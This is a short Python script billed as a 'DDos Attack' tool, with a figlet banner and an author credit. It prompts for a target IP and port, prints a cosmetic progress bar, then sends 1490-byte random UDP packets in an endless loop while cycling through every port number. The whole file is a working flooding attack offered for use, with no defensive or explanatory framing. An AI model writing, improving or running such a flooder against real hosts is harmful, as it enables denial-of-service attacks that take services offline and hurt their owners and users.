import sys
import os
import time
import socket
import random
from datetime import datetime

# Get current time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

# Clear screen and print banner
os.system("clear")
os.system("figlet DDos Attack")
print("Author   : Laila19")
print("GitHub   : https://github.com/lailacypher")
print()

# User input for target IP and port
ip = input("Target IP: ")
port = int(input("Port: "))

# Clear screen and show attack starting progress
os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(2)

# Send packets in an infinite loop
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port = port + 1
    print(f"Sent {sent} packet(s) to {ip} through port: {port}")
    
    # Reset port after reaching 65534
    if port == 65534:
        port = 1
